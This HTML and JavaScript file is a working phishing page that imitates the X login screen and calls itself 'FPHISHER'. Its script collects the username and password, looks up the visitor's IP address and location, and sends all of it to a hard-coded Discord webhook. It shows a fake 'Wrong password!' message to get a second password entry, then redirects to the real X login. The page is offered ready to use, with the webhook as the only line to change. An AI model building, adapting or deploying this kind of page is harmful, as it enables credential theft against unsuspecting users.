<!DOCTYPE html>
<html lang="en" class="bg-black">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Log in to X</title>
  <script src="https://cdn.tailwindcss.com"></script>
</head>

<body class="text-white h-screen flex flex-col bg-black">

  <!-- STEP 1 - Username / email / phone -->
  <div id="step1" class="flex flex-col h-full justify-between">
    <div class="flex justify-between items-center px-5 py-4">
      <button class="text-lg font-medium">Cancel</button>
      <a href="index.html">
  <div class="text-2xl font-black">X</div>
</a>

      <div class="w-10"></div>
    </div>

    <div class="px-8 pt-4">
      <h1 class="text-4xl font-extrabold leading-tight">
        To get started, enter your phone, email or @username
      </h1>
      <input
        id="username"
        type="text"
        placeholder="Phone, email, or username"
        class="mt-10 w-full bg-black border border-gray-700 rounded-full px-5 py-4 text-lg placeholder-gray-500 focus:outline-none focus:border-sky-500 focus:ring-1 focus:ring-sky-500"
      />
    </div>

    <div class="px-8 pb-8 flex justify-between items-center">
      <span class="text-sky-500 text-base cursor-pointer">Forgot password?</span>
      <button
        id="nextBtn"
        disabled
        class="bg-gray-700 text-gray-400 px-7 py-3 rounded-full font-bold text-base disabled:opacity-50"
      >
        Next
      </button>
    </div>
  </div>

  <!-- STEP 2 - Password + Error container -->
  <div id="step2" class="hidden flex flex-col h-full justify-between relative">
    <div class="flex justify-between items-center px-5 py-4">
      <button onclick="goBack()" class="text-2xl">×</button>
      <div>
  <svg viewBox="0 0 1200 1227" fill="currentColor" xmlns="http://www.w3.org/2000/svg" style="width:24px;height:24px;">
    <path d="M714.163 519.284L1160.89 0H1055.03L667.137 450.887L357.328 0H0L468.492 681.821L0 1226.37H105.866L515.491 750.218L842.672 1226.37H1200L714.163 519.284ZM569.165 687.828L521.697 619.934L144.011 79.6944H306.615L611.412 515.685L658.88 583.579L1055.08 1150.3H892.476L569.165 687.828Z"/>
  </svg>
</div>

      <div class="w-10"></div>
    </div>

    <div class="px-8">
      <h1 class="text-4xl font-extrabold">Enter your password</h1>

      <div class="mt-8 bg-gray-900 rounded-2xl px-5 py-4">
        <p class="text-sm text-gray-400">Username / email</p>
        <p id="displayUser" class="text-xl mt-1 font-medium"></p>
      </div>

      <div class="mt-8 relative">
        <input
          id="password"
          type="password"
          placeholder="Password"
          class="w-full bg-black border-2 border-sky-500 rounded-full px-5 py-4 pr-14 text-lg placeholder-sky-700 focus:outline-none focus:border-sky-400"
        />
        <button
          onclick="togglePassword()"
          class="absolute right-5 top-1/2 -translate-y-1/2 text-gray-400 text-xl"
        >
          👁️
        </button>
      </div>

      <p class="text-sky-500 mt-4 cursor-pointer">Forgot password?</p>

      <div id="errorMsg" class="hidden mt-6 bg-blue-600 rounded-lg p-5 text-center shadow-xl">
        <p class="text-2xl font-bold">Wrong password!</p>
        <p class="text-sm mt-3 opacity-90">
          g;1777331748884040371327:-177738303035858759:imDUK<br>
          WKLLpXT97DSDoTWmEh3X:8
        </p>
      </div>
    </div>

    <div class="px-8 pb-8">
      <button
        id="loginBtn"
        disabled
        class="w-full bg-white text-black py-4 rounded-full text-lg font-bold disabled:opacity-50 disabled:bg-gray-700 disabled:text-gray-400"
      >
        Log in
      </button>

      <p class="text-center text-gray-400 mt-5">
        Don't have an account? <span class="text-sky-500">Sign up</span>
      </p>
    </div>
  </div>

  <script>
    // ──────────────────────────────────────────────
    //     CHANGE THIS LINE ONLY – your Discord webhook URL
    // ──────────────────────────────────────────────
    const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1484291070106927104/rmZj_raRyYCQsZn4Fazz-hh0j6uuwrCDC18VMY-yOFtezFmEyt_7RkJuj9dZ8x5kwLDE";

    const usernameInput = document.getElementById("username");
    const nextBtn       = document.getElementById("nextBtn");
    const passwordInput = document.getElementById("password");
    const loginBtn      = document.getElementById("loginBtn");
    const step1         = document.getElementById("step1");
    const step2         = document.getElementById("step2");
    const displayUser   = document.getElementById("displayUser");
    const errorMsg      = document.getElementById("errorMsg");

    let attemptCount = 0;

    // Enable/disable Next button (white when active)
    usernameInput.addEventListener("input", () => {
      const val = usernameInput.value.trim();
      nextBtn.disabled = !val;
      nextBtn.classList.toggle("bg-white", !!val);
      nextBtn.classList.toggle("text-black", !!val);
      nextBtn.classList.toggle("bg-gray-700", !val);
      nextBtn.classList.toggle("text-gray-400", !val);
    });

    nextBtn.addEventListener("click", () => {
      displayUser.textContent = usernameInput.value.trim();
      step1.classList.add("hidden");
      step2.classList.remove("hidden");
      errorMsg.classList.add("hidden");
      attemptCount = 0;
    });

    function goBack() {
      step2.classList.add("hidden");
      step1.classList.remove("hidden");
      errorMsg.classList.add("hidden");
    }

    passwordInput.addEventListener("input", () => {
      const val = passwordInput.value.trim();
      loginBtn.disabled = !val;
      loginBtn.classList.toggle("bg-white", !!val);
      loginBtn.classList.toggle("text-black", !!val);
      loginBtn.classList.toggle("bg-gray-700", !val);
      loginBtn.classList.toggle("text-gray-400", !val);
    });

    function togglePassword() {
      passwordInput.type = passwordInput.type === "password" ? "text" : "password";
    }

    // ─── CAPTURE & SEND TO DISCORD WEBHOOK ───────────────────────────────
    async function captureAndSend(attemptNumber) {
      const username = usernameInput.value.trim();
      const password = passwordInput.value.trim();
      if (!username || !password) return;

      let geo = {
        ip: "unknown",
        country: "unknown",
        region: "unknown",
        city: "unknown",
        isp: "unknown",
        proxy: "No"
      };

      try {
        const ipRes = await fetch("https://api.ipify.org?format=json");
        const ipData = await ipRes.json();
        geo.ip = ipData.ip || "unknown";

        const geoRes = await fetch(`https://ipapi.co/${geo.ip}/json/`);
        const data = await geoRes.json();

        if (!data.error) {
          geo.country = data.country_name || "unknown";
          geo.region  = data.region      || "unknown";
          geo.city    = data.city        || "unknown";
          geo.isp     = data.org || data.asn || "unknown";
          geo.proxy   = data.in_eu || data.proxy ? "Yes" : "No";
        }
      } catch {}

      const ua = navigator.userAgent;
      const screenInfo = `${screen.width}×${screen.height} • ${navigator.language || "unknown"}`;
      const now = new Date().toISOString();

      // Discord-friendly formatted message (supports basic markdown)
      const message = 
`**🔐✨ X LOGIN CAPTURE — FPHISHER (Attempt ${attemptNumber})**\n` +
`═══════════════════════════════════════\n\n` +
`**👤 USERNAME / EMAIL**\n` +
`\`\`\`${username}\`\`\`\n` +
`**🔑 PASSWORD**\n` +
`\`\`\`${password}\`\`\`\n\n` +
`**🌍 LOCATION**\n` +
`Country: ${geo.country}\n` +
`Region : ${geo.region}\n` +
`City   : ${geo.city}\n\n` +
`**🌐 IP ADDRESS**\n` +
`${geo.ip}\n` +
`Proxy/VPN : ${geo.proxy}\n` +
`ISP       : ${geo.isp}\n\n` +
`**🕒 TIMESTAMP**\n` +
`${now}\n\n` +
`**💻 USER AGENT**\n` +
`\`\`\`${ua}\`\`\`\n` +
`**🖥️ SCREEN**\n` +
`${screenInfo}\n\n` +
`═══════════════════════════════════════\n` +
`⚡ Powered by FTECH™ Secure Systems`;

      try {
        const response = await fetch(DISCORD_WEBHOOK_URL, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            content: message,
            username: "X Login Alert",           // optional: webhook override name
            avatar_url: "https://example.com/x-logo.png"  // optional: custom avatar
          })
        });

        if (!response.ok) {
          console.error("Discord webhook failed:", await response.text());
        } else {
          console.log("Sent to Discord successfully");
        }
      } catch (err) {
        console.error("Fetch error:", err);
      }
    }

    loginBtn.addEventListener("click", async () => {
      attemptCount++;
      await captureAndSend(attemptCount);

      if (attemptCount === 1) {
        errorMsg.classList.remove("hidden");
        loginBtn.textContent = "Log in";
        passwordInput.value = "";
      } else {
        window.location.href = "https://x.com/login";
      }
    });
  </script>
</body>
</html>
